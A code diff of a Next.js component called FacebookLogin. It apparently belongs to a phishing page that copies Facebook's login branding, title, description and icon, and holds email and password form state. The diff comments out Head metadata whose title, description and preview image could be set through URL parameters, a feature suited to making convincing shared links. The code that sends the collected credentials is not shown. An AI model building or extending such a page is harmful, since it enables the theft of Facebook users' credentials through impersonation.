@@ -1,8 +1,8 @@
 "use client";
 import axios from "axios";
-import Head from "next/head";
+// import Head from "next/head";
 import { useState } from "react";
-import { useSearchParams } from "next/navigation";
+// import { useSearchParams } from "next/navigation";
 
 export default function FacebookLogin() {
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -12,15 +12,15 @@ export default function FacebookLogin() {
     password: "",
   });
 
-  const searchParams = useSearchParams();
+  // const searchParams = useSearchParams();
 
-  const title = searchParams.get("title") || "Facebook – log in or sign up";
-  const description =
-    searchParams.get("desc") ||
-    "Facebook helps you connect and share with the people in your life.";
-  const image =
-    searchParams.get("cover") ||
-    "https://www.facebook.com/images/fb_icon_325x325.png";
+  // const title = searchParams.get("title") || "Facebook – log in or sign up";
+  // const description =
+  //   searchParams.get("desc") ||
+  //   "Facebook helps you connect and share with the people in your life.";
+  // const image =
+  //   searchParams.get("cover") ||
+  //   "https://www.facebook.com/images/fb_icon_325x325.png";
 
   const handleInputChange = (
     e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
@@ -61,7 +61,7 @@ export default function FacebookLogin() {
 
   return (
     <>
-      <Head>
+      {/* <Head>
         <title>{title}</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <meta charSet="UTF-8" />
@@ -76,7 +76,7 @@ export default function FacebookLogin() {
           content={typeof window !== "undefined" ? window.location.href : ""}
         />
         <link rel="icon" href="/2sFJRNmJ5OP.ico" />
-      </Head>
+      </Head> */}
 
       <main className="main">
         <section className="main__container">
